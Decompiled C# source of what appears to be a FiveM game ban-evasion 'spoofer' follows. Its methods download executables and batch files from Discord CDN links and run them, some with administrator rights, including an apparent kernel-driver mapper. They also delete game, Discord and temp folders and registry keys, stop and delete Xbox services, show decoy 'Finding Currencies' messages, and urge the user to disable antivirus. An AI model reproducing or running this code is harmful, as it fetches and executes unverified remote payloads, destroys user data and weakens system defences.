using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;
using ns2;

namespace ns3
{
	// Token: 0x02000007 RID: 7
	internal class Class4
	{
		// Token: 0x0600003A RID: 58 RVA: 0x00003EEC File Offset: 0x000020EC
		public static void smethod_0()
		{
			Class3.smethod_4("Finding Currencies...");
			WebClient webClient = new WebClient();
			string fileName = "C:\\Premium\\F857SNSsbat.exe";
			Class3.smethod_4("Downloading FiveM");
			Thread.Sleep(2000);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/799217945996951572/805217930467606608/FiveM.exe", fileName);
			Class3.smethod_4("Successfully downloaded");
			Thread.Sleep(1000);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Class3.smethod_4("Running Files");
			Thread.Sleep(1000);
			Process process2 = Process.Start(fileName);
			Thread.Sleep(1000);
			process2.Close();
			Class3.smethod_3("Successfully installed FiveM");
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003FBC File Offset: 0x000021BC
		public static void smethod_1()
		{
			Class3.smethod_4("Finding currencies...");
			Thread.Sleep(1000);
			Class3.smethod_4("Cleaning Traces");
			Thread.Sleep(2000);
			string value = WindowsIdentity.GetCurrent().User.Value;
			Registry.Users.DeleteSubKeyTree(value + "\\SOFTWARE\\Chromium", false);
			Registry.Users.DeleteSubKeyTree(value + "\\SOFTWARE\\CitizenFX", false);
			Registry.Users.DeleteSubKeyTree(value + "\\SOFTWARE\\FiveM", false);
			Registry.Users.DeleteSubKeyTree(value + "_Classes\\FiveM.ProtocolHandler", false);
			Registry.Users.DeleteSubKeyTree(value + "_Classes\\fivem", false);
			Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\CitizenFX", false);
			Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\FiveM", false);
			Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\Chromium", false);
			Registry.ClassesRoot.DeleteSubKeyTree("fivem", false);
			Registry.ClassesRoot.DeleteSubKeyTree("FiveM.ProtocolHandler", false);
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DigitalEntitlements";
			if (Directory.Exists(path))
			{
				Directory.Delete(path, true);
			}
			string path2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\cache";
			if (Directory.Exists(path2))
			{
				Directory.Delete(path2, true);
			}
			string path3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\CitizenFX";
			if (Directory.Exists(path3))
			{
				Directory.Delete(path3, true);
			}
			string path4 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\mods";
			if (Directory.Exists(path4))
			{
				Directory.Delete(path4, true);
			}
			string path5 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\imgui.inie";
			if (File.Exists(path5))
			{
				File.Delete(path5);
			}
			string path6 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\CitizenFX.ini";
			if (File.Exists(path6))
			{
				File.Delete(path6);
			}
			string path7 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\asi-five.dll";
			if (File.Exists(path7))
			{
				File.Delete(path7);
			}
			string path8 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\adhesive.dll";
			if (File.Exists(path8))
			{
				File.Delete(path8);
			}
			string path9 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\crashes";
			if (Directory.Exists(path9))
			{
				Directory.Delete(path9, true);
			}
			string path10 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\logs";
			if (Directory.Exists(path10))
			{
				Directory.Delete(path10, true);
			}
			string path11 = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Rockstar Games\\Social Club";
			if (Directory.Exists(path11))
			{
				Directory.Delete(path11);
			}
			Class3.smethod_3("Successfully Cleaned Traces");
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00004260 File Offset: 0x00002460
		public static void smethod_2()
		{
			Class3.smethod_4("Finding currencies...");
			Thread.Sleep(1000);
			Class3.smethod_4("Cleaning Traces");
			Thread.Sleep(2000);
			string value = WindowsIdentity.GetCurrent().User.Value;
			Registry.Users.DeleteSubKeyTree(value + "\\SOFTWARE\\Chromium", false);
			Registry.Users.DeleteSubKeyTree(value + "\\SOFTWARE\\CitizenFX", false);
			Registry.Users.DeleteSubKeyTree(value + "\\SOFTWARE\\FiveM", false);
			Registry.Users.DeleteSubKeyTree(value + "_Classes\\FiveM.ProtocolHandler", false);
			Registry.Users.DeleteSubKeyTree(value + "_Classes\\fivem", false);
			Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\CitizenFX", false);
			Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\FiveM", false);
			Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\Chromium", false);
			Registry.ClassesRoot.DeleteSubKeyTree("fivem", false);
			Registry.ClassesRoot.DeleteSubKeyTree("FiveM.ProtocolHandler", false);
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DigitalEntitlements";
			if (Directory.Exists(path))
			{
				Directory.Delete(path, true);
			}
			string path2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\cache";
			if (Directory.Exists(path2))
			{
				Directory.Delete(path2, true);
			}
			string path3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\CitizenFX";
			if (Directory.Exists(path3))
			{
				Directory.Delete(path3, true);
			}
			string path4 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\mods";
			if (Directory.Exists(path4))
			{
				Directory.Delete(path4, true);
			}
			string path5 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\imgui.inie";
			if (File.Exists(path5))
			{
				File.Delete(path5);
			}
			string path6 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\CitizenFX.ini";
			if (File.Exists(path6))
			{
				File.Delete(path6);
			}
			string path7 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\asi-five.dll";
			if (File.Exists(path7))
			{
				File.Delete(path7);
			}
			string path8 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\adhesive.dll";
			if (File.Exists(path8))
			{
				File.Delete(path8);
			}
			string path9 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\crashes";
			if (Directory.Exists(path9))
			{
				Directory.Delete(path9, true);
			}
			string path10 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\logs";
			if (Directory.Exists(path10))
			{
				Directory.Delete(path10, true);
			}
			string path11 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM";
			if (Directory.Exists(path11))
			{
				Directory.Delete(path11);
			}
			string path12 = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Rockstar Games\\Social Club";
			if (Directory.Exists(path12))
			{
				Directory.Delete(path12);
			}
			Class3.smethod_3("Successfully Cleaned Traces");
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00004528 File Offset: 0x00002728
		public static void smethod_3()
		{
			Class3.smethod_4("Unlinking Discord");
			Thread.Sleep(500);
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Discord\\0.0.309\\modules\\discord_rpc";
			if (Directory.Exists(path))
			{
				Directory.Delete(path, true);
			}
			string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Discord\\blob_storage";
			if (Directory.Exists(path2))
			{
				Directory.Delete(path2, true);
			}
			string path3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Discord\\Cache";
			if (Directory.Exists(path3))
			{
				Directory.Delete(path3, true);
			}
			string path4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Discord\\Session Storage";
			if (Directory.Exists(path4))
			{
				Directory.Delete(path4, true);
			}
			string value = WindowsIdentity.GetCurrent().User.Value;
			Registry.ClassesRoot.DeleteSubKeyTree("discord-", false);
			Registry.Users.DeleteSubKeyTree(value + "_Classes\\discord-", false);
			Registry.Users.DeleteSubKeyTree(value + "\\SOFTWARE\\discord-", false);
			Class3.smethod_3("Successfully Unlinked Discord");
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00004630 File Offset: 0x00002830
		public static void smethod_4()
		{
			try
			{
				Class3.smethod_4("Finding Currencies...");
				WebClient webClient = new WebClient();
				string text = "C:\\Premium\\Xbox.bat";
				Class3.smethod_4("Downloading xbox unlinker file");
				Thread.Sleep(2000);
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/799217945996951572/805170066537578516/Xbox.bat", text);
				Class3.smethod_4("Successfully downloaded");
				Thread.Sleep(1000);
				Process process = new Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.UseShellExecute = true;
				process.StartInfo.CreateNoWindow = false;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				process.StartInfo.Verb = "runas";
				Class3.smethod_4("Running Files");
				Thread.Sleep(1000);
				Process process2 = Process.Start(text);
				Thread.Sleep(1000);
				Class3.smethod_4("Deleting Files");
				Thread.Sleep(1000);
				process2.Close();
				File.Delete(text);
				Class3.smethod_3("Successfully removed");
			}
			catch (Exception)
			{
				Class3.smethod_4("\nCould Not Download Xbox unlinker Please Turn Off Your Windows Defender/AntiVirus.");
				Console.ReadLine();
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00004754 File Offset: 0x00002954
		public static void smethod_5()
		{
			Class3.smethod_4("Finding Currencies...");
			WebClient webClient = new WebClient();
			string text = "C:\\Premium\\Mapper.exe";
			string text2 = "C:\\Premium\\Sys.sys";
			Class3.smethod_4("Downloading mapper/sys file");
			Thread.Sleep(2000);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/801775233488650251/805609384196964382/Sys.sys", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/801775233488650251/805609380518690856/Mapper.exe", text);
			Class3.smethod_4("Successfully downloaded");
			Thread.Sleep(1000);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Verb = "runas";
			Class3.smethod_4("Running Files");
			Thread.Sleep(1000);
			Process process2 = Process.Start(text2, text);
			Thread.Sleep(1000);
			Class3.smethod_4("Mapper/System file have been ran");
			Thread.Sleep(1000);
			process2.Close();
			File.Delete(text2);
			File.Delete(text);
			Class3.smethod_3("Successfully ran.");
		}

		// Token: 0x06000040 RID: 64 RVA: 0x0000486C File Offset: 0x00002A6C
		public static void smethod_6()
		{
			Class3.smethod_4("Finding Currencies...");
			WebClient webClient = new WebClient();
			string text = "C:\\Premium\\Regl.bat";
			string text2 = "C:\\Premium\\pepe.bat";
			Class3.smethod_4("Downloading files");
			Thread.Sleep(2000);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/801775233488650251/805609381353619477/Pepe.bat", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/801775233488650251/805609382879690762/Regl.bat", text);
			Class3.smethod_4("Successfully downloaded");
			Thread.Sleep(1000);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.StartInfo.Verb = "runas";
			Class3.smethod_4("Running Files");
			Thread.Sleep(1000);
			Process process2 = Process.Start(text2, text);
			Thread.Sleep(1000);
			Class3.smethod_4("Deleting Files");
			Thread.Sleep(1000);
			process2.Close();
			File.Delete(text);
			File.Delete(text2);
			Class3.smethod_3("Successfully changed registry");
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00004984 File Offset: 0x00002B84
		public static void smethod_7()
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			Console.ForegroundColor = ConsoleColor.Red;
			process.StandardInput.WriteLine("rmdir /S /Q C:\\Users\\%username%\\AppData\\Local\\CrashDumps");
			process.StandardInput.WriteLine("rmdir /S /Q C:\\Users\\%username%\\AppData\\Local\\Temp\\");
			process.StandardInput.WriteLine("rmdir /S /Q C:\\Users\\%username%\\AppData\\Local\\D3DSCache");
			process.StandardInput.WriteLine("reg delete HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\IdentityCRL\\StoredIdentities /f");
			process.StandardInput.WriteLine("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\GameDVR /v AllowGameDVR /t REG_DWORD /d 0 /f");
			process.StandardInput.WriteLine("sc stop XboxNetApiSvc");
			process.StandardInput.WriteLine("sc stop XboxGipSvc");
			process.StandardInput.WriteLine("sc stop XblAuthManager");
			process.StandardInput.WriteLine("sc stop XblGameSave");
			process.StandardInput.WriteLine("sc delete XboxNetApiSvc");
			process.StandardInput.WriteLine("sc delete XboxGipSvc");
			process.StandardInput.WriteLine("sc delete XblAuthManager");
			process.StandardInput.WriteLine("sc delete XblGameSave");
			process.StandardInput.WriteLine("taskkill /f /im discord.exe");
			process.StandardInput.WriteLine("taskkill /f /im XboxAppServices.exe");
			process.StandardInput.WriteLine("taskkill /f /im fivem.exe");
		}
	}
}
